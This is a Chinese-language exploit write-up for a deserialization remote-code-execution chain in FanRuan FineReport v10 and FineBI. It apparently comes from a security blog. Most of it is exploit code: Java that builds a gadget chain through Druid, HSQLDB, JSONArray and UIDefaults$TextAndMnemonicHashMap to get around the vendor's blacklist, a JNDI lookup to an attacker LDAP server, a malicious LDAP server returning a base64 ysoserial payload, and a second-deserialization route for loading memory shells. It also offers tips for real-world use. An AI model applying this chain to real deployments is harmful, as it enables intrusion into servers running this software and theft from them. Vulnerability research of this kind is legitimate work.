## 前言

该帆软反序列化影响范围是5月更新前全版本的v10以及FineBi。随着近日关于该漏洞的分析越来越多，故将此文发出。本次反序列化过程思路是通过druid调用hsqldb进行RCE。在上一大版本中，封禁了主要的类：`java.security.SignedObject`。因此无法通过二次反序列化来进行利用。黑名单具体位置在`fine-
core-10.0.jar!/com/fr/serialization/blacklist.txt`。黑名单中包含了绝大部分公开的反序列化利用类，通过单纯的反序列化来硬钢黑名单是不行的，需要一个新的方式来进行rce。帆软的驱动中自带HSQL，拜读浅蓝的HSQL利用指南可以更快的摸索出RCE利用方式：<https://b1ue.cn/archives/458.html。>

## JNDI利用方式

帆软在初始环境下，存在hsqldb依赖。浅蓝的文章中有提到关于hsqldb的jndi利用方式：通过CALL来调用高危SQL命令，其中`java.rmi.Naming.list`和`javax.naming.InitialContext.doLookup`都能正常调用

    
    
    Class.forName("com.fr.third.org.hsqldb.jdbc.JDBCDriver");
    String dburl = "jdbc:hsqldb:mem";
    Connection connection = DriverManager.getConnection(dburl, "sa", "");
    connection.prepareStatement("CALL \"javax.naming.InitialContext.doLookup\"('ldap://127.0.0.1:1389/remoteExploit8')").executeQuery();
    

这里先对本地环境进行试验

![](./assets/1116823576349121784.png)  
后续通过DruidDataSource�封装，来扩大利用范围（实战利用时可以添加setInitialSize函数，来减少连接次数）

![](./assets/5323993932976552450.png)  
在druid序列化过程中会碰到部分元素无法被序列化的情况，只需将无法被序列化的内容置空或反射更改为空即可

![](./assets/5840848365969357884.png)

## 调用链寻找

getter/setter方法的调用利用类有CommonBean、Hibernate、Rome、Jackson等。前几个类在二次反序列化爆出来后，就已经添加进黑名单了，而Jackson.POJONode在之后陆续的几个小版本中也被关进了小黑屋，因此通过Jackson.POJONode来调用getter也不可取了。Jackson链流程的关键是触发POJONode父类BaseJsonNode的toString方法，进而调用ObjectWriter#writeValueAsString来反序列化调用getter/setter方法。而这里我们通过com.fr.json.JSONArray#toString，进一步触发到com.fr.json.revise.EmbedJson#encode，该方法下的MAPPER.writeValueAsString格外显眼

![](./assets/6931364599332820086.png)  
通过JSONArray.toString来调用封装在ArrayList数组中的templates能成功执行RCE（此时想必大家也都知道如何衔接上上文的DruidDataSource了）。

![](./assets/4227123607798479586.png)  
调用栈如下

    
    
    serializeFields:779, BeanSerializerBase {com.fr.third.fasterxml.jackson.databind.ser.std}
    serialize:178, BeanSerializer {com.fr.third.fasterxml.jackson.databind.ser}
    serializeContents:119, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    serialize:79, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    serialize:18, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    _serialize:479, DefaultSerializerProvider {com.fr.third.fasterxml.jackson.databind.ser}
    serializeValue:318, DefaultSerializerProvider {com.fr.third.fasterxml.jackson.databind.ser}
    writeValue:3303, ObjectMapper {com.fr.third.fasterxml.jackson.databind}
    writeObject:389, GeneratorBase {com.fr.third.fasterxml.jackson.core.base}
    serialize:227, EmbedJson$JsonArraySerializer {com.fr.json.revise}
    serialize:224, EmbedJson$JsonArraySerializer {com.fr.json.revise}
    serializeContents:119, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    serialize:79, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    serialize:18, IndexedListSerializer {com.fr.third.fasterxml.jackson.databind.ser.impl}
    _serialize:479, DefaultSerializerProvider {com.fr.third.fasterxml.jackson.databind.ser}
    serializeValue:318, DefaultSerializerProvider {com.fr.third.fasterxml.jackson.databind.ser}
    _writeValueAndClose:4719, ObjectMapper {com.fr.third.fasterxml.jackson.databind}
    writeValueAsString:3964, ObjectMapper {com.fr.third.fasterxml.jackson.databind}
    encode:99, EmbedJson {com.fr.json.revise}
    encode:560, JSONArray {com.fr.json}
    toString:590, JSONArray {com.fr.json}
    main:56, main
    

能调用toString方法的类基本都被封禁了，这篇文章给了新思路：<https://xz.aliyun.com/t/14732>  
通过javax.swing.UIDefaults的私有类TextAndMnemonicHashMap#get方法来调用toString。key可控，当key对应的value为空时，则调用key.toString。此时的key需要是上文的jsonArray对象才能顺利触发

![](./assets/1450272583112421283.png)  
且该类继承于HashMap，构建实例后可以通过Hashtable触发java.util.AbstractMap#equals可以很好的衔接上述get方法的调用，类似于CC7的入口。

![](./assets/5933268540016000279.png)  
此时demo如下：

    
    
    List<Object> list = new ArrayList();
    list.add(templates);
    JSONArray jsonArray = new JSONArray();
    jsonArray.add(list);
    // jsonArray.toString();
    Class<?> clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
    Constructor<?> constructor = clazz.getDeclaredConstructor();
    constructor.setAccessible(true);
    HashMap hashMap1 = (HashMap) constructor.newInstance(null);
    hashMap1.put(jsonArray,"yy");
    
    HashMap hashMap2 = (HashMap) constructor.newInstance();
    hashMap2.put(jsonArray,"zZ");
    
    Hashtable hashtable = new Hashtable();
    hashtable.put(hashMap1,1);
    hashtable.put(hashMap2,2);
    
    Serialize.writeObject(hashtable,"demo");
    Serialize.readObject("demo");
    

但这样写就无法满足java.util.AbstractMap#equals中value为空的条件

![](./assets/4706110598865724964.png)

![](./assets/2842457390750651091.png)  
因此需要在hashTable.put后，将hastMap中的value置空

    
    
    hashMap1.put(jsonArray,null);
    hashMap2.put(jsonArray,null);
    

![](./assets/4934026706192047760.png)  
至此帆软新的利用链构造完成，部分伪代码如下

    
    
    Class<? extends DruidDataSource> clazz = druidXADataSource.getClass();
    Class<?> superclass = clazz.getSuperclass();
    Field transactionHistogram = superclass.getDeclaredField("transactionHistogram");
    transactionHistogram.setAccessible(true);
    transactionHistogram.set(druidXADataSource,null);
    Functions.setField(druidXADataSource,"initedLatch",null);
    
    List<Object> list = new ArrayList();
    list.add(druidXADataSource);
    JSONArray jsonArray = new JSONArray();
    jsonArray.add(list);
    
    
    Class<?> clazz2 = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");    //javax.swing.UIDefaults$TextAndMnemonicHashMap.get(key)    -> key.toString
    Constructor<?> constructor = clazz2.getDeclaredConstructor();
    constructor.setAccessible(true);
    HashMap o = (HashMap) constructor.newInstance(null);
    o.put(jsonArray,"yy");
    HashMap o1 = (HashMap) constructor.newInstance(null);
    o1.put(jsonArray,"zZ");
    
    Hashtable hashtable = new Hashtable();
    hashtable.put(o,1);
    hashtable.put(o1,1);
    
    o.put(jsonArray,null);
    o1.put(jsonArray,null);
    

至于JNDI Server端，可以通过如下两个方式进行高版本jndi绕过：

  1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
  2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。  
这里采用方式二，server端demo如下

    
        public class LdapServer {
     private static final String LDAP_BASE = "dc=example,dc=com";
    
     public static void main (String[] args) {
    
         String url = "http://127.0.0.1:39876/#Evil";
         int port = 1389;
    
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
                 "listen",
                 InetAddress.getByName("0.0.0.0"),
                 port,
                 ServerSocketFactory.getDefault(),
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
             config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + port);
             ds.startListening();
         }
         catch ( Exception e ) {
             e.printStackTrace();
         }
     }
    
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
         ...
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException, NotFoundException, CannotCompileException {
             URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
             ...
             e.addAttribute("javaClassName", "Exploit"); 
             ...        
             // 核心部分 此处测试使用CB183利用链（实战情况下自行判断环境选择利用链）
             // 可以直接生成 java -jar ysoserial.jar CommonsBeanutils183NOCC calc.exe|base64
             payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJh";      
             e.addAttribute("javaSerializedData", Base64.getDecoder().decode(payload));
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
    
     }
    }
    

## 二次反序列化方式

出网利用终归是有些不够优雅，因此这里继续着眼于HSQL的利用上。既然HSQL能调用CALL命令，那么就寻找一个deserialize的函数，进行二次反序列化即可。通过tabby在帆软jar中辅助寻找到该函数：`org.terracotta.modules.ehcache.collections.SerializationHelper#deserialize`

![](./assets/2500764502117253961.png)  
通过CALL指令能成功调用该函数执行反序列化。至于之后的exp就不展示了，内存马、tomcatecho之类的利用都可以通过该方式进行加载。

![](./assets/187518194952395637.png)

## 参考文章

<https://paper.seebug.org/942/>  
<https://b1ue.cn/archives/458.html>  
<https://xz.aliyun.com/t/14732>

